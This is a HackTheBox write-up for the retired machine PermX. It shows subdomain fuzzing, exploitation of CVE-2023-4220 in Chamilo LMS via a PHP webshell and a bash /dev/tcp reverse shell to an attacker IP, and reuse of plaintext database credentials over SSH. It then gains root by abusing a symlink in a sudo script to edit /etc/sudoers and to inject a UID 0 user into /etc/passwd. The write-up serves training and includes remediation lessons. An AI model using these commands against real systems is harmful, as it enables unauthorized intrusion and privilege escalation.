# PermX — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | PermX |
| OS | Linux (Ubuntu 22.04) |
| Difficulty | Easy |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.79.85` |
| Domain | `permx.htb`, `lms.permx.htb` |
| Tools Used | Nmap, ffuf, curl, nc, Python exploit script, openssl |
| CVEs | CVE-2023-4220 (Chamilo LMS unauthenticated file upload RCE) |
| Date | October 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Reconnaissance](#reconnaissance)
- [Foothold — CVE-2023-4220 Unauthenticated File Upload RCE on Chamilo LMS](#foothold--cve-2023-4220-unauthenticated-file-upload-rce-on-chamilo-lms)
- [Lateral Movement — Plaintext DB Credentials → SSH as mtz](#lateral-movement--plaintext-db-credentials--ssh-as-mtz)
- [Privilege Escalation — acl.sh Symlink Abuse (Two Paths)](#privilege-escalation--aclsh-symlink-abuse-two-paths)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT\&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|----------|
| 1 | Nmap two-phase scan | Ports 22 (SSH) and 80 (Apache) open; redirect to `permx.htb` |
| 2 | ffuf vHost fuzzing on `FUZZ.permx.htb` | `lms.permx.htb` discovered — Chamilo LMS instance |
| 3 | Chamilo version identified → CVE-2023-4220 | Unauthenticated file upload to `bigUpload.php` — no auth required |
| 4a | `curl` manual upload of `shell.php` + `rev.php` | Webshell confirms `www-data`; reverse shell landed on port 4455 |
| 4b | Python exploit script (`exploit.py`) | Automated payload upload + trigger → reverse shell as `www-data` |
| 5 | Read `/var/www/chamilo/app/config/configuration.php` | DB password `03F6lY3uXAP2bkW8` found in plaintext |
| 6 | SSH as `mtz` with DB password | Credential reuse — interactive shell, user flag captured |
| 7 | `sudo -l` → `(ALL : ALL) NOPASSWD: /opt/acl.sh` | Custom ACL script runs as root — reads target from `/home/mtz/` |
| 8a | **Path 1:** Symlink `/home/mtz/root` → `/etc/sudoers` + `setfacl rw` | Write `mtz ALL=(ALL:ALL) NOPASSWD: ALL` → `sudo bash` → root |
| 8b | **Path 2:** Symlink `/home/mtz/passwd_link` → `/etc/passwd` + `setfacl rwx` | Inject root-privileged `hacker` user → `su hacker` → root |

---

## Reconnaissance

### Nmap — Two-Phase Scan

```bash
Hackerpatel007_1@htb[/htb]$ ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.129.79.85 \
  | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
Hackerpatel007_1@htb[/htb]$ nmap -p$ports -Pn -sC -sV 10.129.79.85
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
```

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.79.85 permx.htb" | sudo tee -a /etc/hosts
```

### Subdomain Discovery with ffuf

Browsing to `http://permx.htb` returns a generic eLearning landing page — no attack surface. Run a vHost fuzz first without a filter to identify the baseline response (18 words), then re-run with `-fw 18` to suppress it:

```bash
Hackerpatel007_1@htb[/htb]$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -H "Host: FUZZ.permx.htb" \
  -u http://permx.htb \
  -t 200 -ic -fw 18
```

```
[Status: 200, Size: 36182, Words: 12829]  * FUZZ: www
[Status: 200, Size: 19347, Words: 4910]   * FUZZ: lms
```

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.79.85 lms.permx.htb" | sudo tee -a /etc/hosts
```

`lms.permx.htb` serves a **Chamilo LMS** login page. A quick search surfaces **CVE-2023-4220** immediately — critical unauthenticated file upload affecting versions prior to 1.11.26.

---

## Foothold — CVE-2023-4220 Unauthenticated File Upload RCE on Chamilo LMS

**The vulnerability:** Chamilo's `bigUpload.php` handler performs no authentication check and no file type validation. Any HTTP client can POST any file to:

```
/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported
```

Uploads land in `/main/inc/lib/javascript/bigupload/files/` — a directory served directly by Apache. A PHP file uploaded here is immediately web-accessible and executed by the PHP engine.

> **CVSS Score: 9.8 (Critical)** — No authentication required, remote code execution.

### Method A — Manual curl

```bash
Hackerpatel007_1@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
Hackerpatel007_1@htb[/htb]$ curl -F 'bigUploadFile=@shell.php' \
  'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
# → The file has successfully been uploaded.

Hackerpatel007_1@htb[/htb]$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php?cmd=id'
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as `www-data`. Upload and trigger a reverse shell:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lnvp 4455
Hackerpatel007_1@htb[/htb]$ echo '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.16.36/4455 0>&1'\'' "); ?>' > rev.php
Hackerpatel007_1@htb[/htb]$ curl -F 'bigUploadFile=@rev.php' \
  'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
Hackerpatel007_1@htb[/htb]$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rev.php'
```

```
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
```

### Method B — Python Exploit Script

```bash
Hackerpatel007_1@htb[/htb]$ nc -lnvp 1234
Hackerpatel007_1@htb[/htb]$ python3 exploit.py http://lms.permx.htb/ ignored --shell rce.php
# → [+] File uploaded successfully!
# → [*] Request timed out. This can happen when the reverse shell is active.
```

```
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
```

### Stabilise the Shell

```bash
www-data@permx:~$ script /dev/null -c bash
```

---

## Lateral Movement — Plaintext DB Credentials → SSH as mtz

```bash
www-data@permx:~$ cat /var/www/chamilo/app/config/configuration.php
```

```php
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
$_configuration['root_web'] = 'http://lms.permx.htb/';
```

```bash
www-data@permx:~$ cat /etc/passwd | grep -v nologin | grep -v false
# → root:x:0:0 and mtz:x:1000:1000
```

```bash
Hackerpatel007_1@htb[/htb]$ ssh mtz@permx.htb
mtz@permx.htb's password: 03F6lY3uXAP2bkW8
mtz@permx:~$ cat user.txt
bf92d7be816f3b4e5cd83e125305e989
```

Credential reuse confirmed — Chamilo DB password reused as OS account password.

---

## Privilege Escalation — acl.sh Symlink Abuse (Two Paths)

```bash
mtz@permx:~$ sudo -l
# → (ALL : ALL) NOPASSWD: /opt/acl.sh

mtz@permx:~$ cat /opt/acl.sh
```

```bash
#!/bin/bash
if [ "$#" -ne 3 ]; then exit 1; fi
user="$1"; perm="$2"; target="$3"
if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    echo "Access denied."; exit 1
fi
if [ ! -f "$target" ]; then echo "Target must be a file."; exit 1; fi
/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

**The flaw:** The script checks that `$target` starts with `/home/mtz/` but does not resolve symlinks before the check. `[ -f "$target" ]` follows symlinks — it returns true if the symlink target exists. `setfacl` also follows symlinks and modifies the underlying file. So a symlink at `/home/mtz/link` pointing to `/etc/sudoers` passes the path check but grants ACL on `/etc/sudoers`.

---

### Path 1 — Sudoers Write → Unrestricted sudo

```bash
mtz@permx:~$ ln -s /etc/sudoers /home/mtz/root
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/root
# setfacl follows symlink → mtz gets rw on /etc/sudoers

mtz@permx:~$ getfacl /etc/sudoers
# user:mtz:rw-

mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
# appends through symlink directly to /etc/sudoers

mtz@permx:~$ sudo bash
root@permx:/home/mtz# cat /root/root.txt
72a9d97fc9283f31a5624b0994f6cd40
```

---

### Path 2 — /etc/passwd Injection → New UID 0 User

```bash
mtz@permx:/opt$ ln -s /etc/passwd /home/mtz/passwd_link
mtz@permx:/opt$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd_link
# setfacl follows symlink → mtz gets rwx on /etc/passwd

mtz@permx:/opt$ openssl passwd -1 -salt hacker password123
# → $1$hacker$maoVUGb6XNp03USLr9Oqq1

mtz@permx:/opt$ echo 'hacker:$1$hacker$maoVUGb6XNp03USLr9Oqq1:0:0:root:/root:/bin/bash' >> /home/mtz/passwd_link

mtz@permx:/opt$ su hacker
Password: password123
root@permx:/opt# id
uid=0(root) gid=0(root) groups=0(root)
root@permx:/opt# cat /root/root.txt
72a9d97fc9283f31a5624b0994f6cd40
```

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `bf92d7be816f3b4e5cd83e125305e989` |
| Root Flag | `72a9d97fc9283f31a5624b0994f6cd40` |

---

## Lessons Learned

1. **Subdomain fuzzing is mandatory when the base domain returns a generic page.** `permx.htb` had no attack surface. All functionality was on `lms.permx.htb`. The `-fw` filter in ffuf (filter by word count) eliminates baseline noise efficiently — run without it first to identify the baseline word count, then re-run with `-fw <count>`.

2. **CVE-2023-4220 is a textbook example of missing three independent controls simultaneously.** Authentication, file type validation, and web-root exclusion were all absent. Any single one of these three controls would have significantly reduced the severity.

3. **PHP application config files are the highest-priority post-shell read target.** `configuration.php` in any Chamilo or Laravel installation contains plaintext DB credentials. After landing a web shell: config file → DB password → credential reuse against OS accounts.

4. **Symlink attacks against scripts that prefix-check paths are a fundamental Linux privesc class.** The `acl.sh` script checked `$target` started with `/home/mtz/` but didn't check whether the path was a real file or a symlink. `[ -f ]` follows symlinks; `setfacl` follows symlinks. The path check and the actual operation disagree about what object they're touching. The fix is `realpath`: `if [[ "$(realpath "$target")" != /home/mtz/* ]]`.

5. **Writing to `/etc/passwd` is a viable root path when `/etc/sudoers` is syntactically fragile.** Linux still honours MD5-crypt password hashes in `/etc/passwd` field 2. A user with UID 0 is root regardless of username. `openssl passwd -1 -salt <salt> <password>` generates the correct format.

---

## Full Attack Chain Reference

```
Nmap → ports 22, 80 (Apache → permx.htb)
/etc/hosts → permx.htb
permx.htb → generic eLearning page (no attack surface)
ffuf -H "Host: FUZZ.permx.htb" -fw 18
  → lms.permx.htb → Chamilo LMS
CVE-2023-4220: bigUpload.php no auth + no type check

── Method A ──
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -F bigUploadFile=@shell.php → uploaded
curl .../shell.php?cmd=id → uid=33(www-data) ✓
nc -lnvp 4455 → upload + trigger rev.php → www-data shell

── Method B ──
nc -lnvp 1234 → python3 exploit.py → www-data shell

cat /var/www/chamilo/app/config/configuration.php
  → db_password: 03F6lY3uXAP2bkW8
ssh mtz@permx.htb (reused password) → mtz shell
cat ~/user.txt: bf92d7be816f3b4e5cd83e125305e989

sudo -l → NOPASSWD: /opt/acl.sh
cat /opt/acl.sh → setfacl on $target within /home/mtz/* (no symlink check)

── Path 1: sudoers ──
ln -s /etc/sudoers /home/mtz/root
sudo /opt/acl.sh mtz rw /home/mtz/root → mtz gets rw on /etc/sudoers
echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
sudo bash → root

── Path 2: /etc/passwd ──
ln -s /etc/passwd /home/mtz/passwd_link
sudo /opt/acl.sh mtz rwx /home/mtz/passwd_link → mtz gets rwx on /etc/passwd
openssl passwd -1 -salt hacker password123 → $1$hacker$maoVUGb6XNp03USLr9Oqq1
echo 'hacker:$1$hacker$...:0:0:root:/root:/bin/bash' >> /home/mtz/passwd_link
su hacker (password123) → uid=0(root)
cat /root/root.txt: 72a9d97fc9283f31a5624b0994f6cd40
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `ports=$(nmap -Pn -p- --min-rate=1000 -T4 <IP> \| grep '^[0-9]' \| cut -d '/' -f 1 \| tr '\n' ',' \| sed s/,$//)` | Fast all-port sweep |
| `nmap -p$ports -Pn -sC -sV <IP>` | Deep version and script scan |
| `ffuf -w <wordlist> -H "Host: FUZZ.permx.htb" -u http://permx.htb -t 200 -ic -fw 18` | vHost fuzzing — `-fw 18` removes baseline noise |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php` | Minimal PHP webshell |
| `curl -F 'bigUploadFile=@shell.php' '.../bigUpload.php?action=post-unsupported'` | Upload via CVE-2023-4220 |
| `curl '.../bigupload/files/shell.php?cmd=id'` | Verify RCE |
| `nc -lnvp 4455` | Reverse shell listener |
| `python3 exploit.py http://lms.permx.htb/ ignored --shell rce.php` | Automated CVE-2023-4220 exploit |
| `script /dev/null -c bash` | Upgrade shell to PTY |
| `cat /var/www/chamilo/app/config/configuration.php` | Plaintext DB credentials |
| `ssh mtz@permx.htb` | SSH with reused DB password |
| `sudo -l` | Enumerate sudo rights |
| `cat /opt/acl.sh` | Read privileged script |
| `ln -s /etc/sudoers /home/mtz/root` | Symlink for Path 1 |
| `sudo /opt/acl.sh mtz rw /home/mtz/root` | Grant mtz write on /etc/sudoers |
| `echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root` | Append sudo rule via symlink |
| `sudo bash` | Root via new sudo rule |
| `ln -s /etc/passwd /home/mtz/passwd_link` | Symlink for Path 2 |
| `sudo /opt/acl.sh mtz rwx /home/mtz/passwd_link` | Grant mtz write on /etc/passwd |
| `openssl passwd -1 -salt hacker password123` | Generate MD5-crypt hash |
| `echo 'hacker:$1$hacker$...:0:0:root:/root:/bin/bash' >> /home/mtz/passwd_link` | Inject UID 0 user |
| `su hacker` | Root via injected account |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|--------------|
| T1595 | T1595.001 | Nmap two-phase full TCP scan |
| T1595 | T1595.003 | ffuf vHost brute-force with `-fw 18` filter |
| T1592 | T1592.002 | Chamilo LMS version identified; CVE-2023-4220 research |
| T1190 | — | CVE-2023-4220 unauthenticated PHP file upload via `bigUpload.php` |
| T1505 | T1505.003 | PHP webshell uploaded for RCE verification |
| T1059 | T1059.004 | PHP reverse shell as `www-data` |
| T1552 | T1552.001 | Plaintext DB password from `configuration.php` |
| T1021 | T1021.004 | SSH lateral movement from web shell to `mtz` with reused DB password |
| T1548 | T1548.003 | `mtz` NOPASSWD: `/opt/acl.sh` — sudo-permitted script used as privesc vehicle |
| T1574 | T1574.005 | Symlink in `/home/mtz/` bypasses path prefix check; `setfacl` follows to root-owned file |
| T1222 | T1222.002 | `setfacl -m u:mtz:rw` applied to `/etc/sudoers` and `/etc/passwd` via symlink |
| T1136 | T1136.001 | UID 0 user `hacker` injected into `/etc/passwd` (Path 2) |
| T1548 | T1548.003 | `mtz ALL=(ALL:ALL) NOPASSWD: ALL` appended to sudoers; `sudo bash` → root (Path 1) |

*HackTheBox retired machine — writeup published after official retirement.*
*Penetration Tester role in India | Target: January 2027*
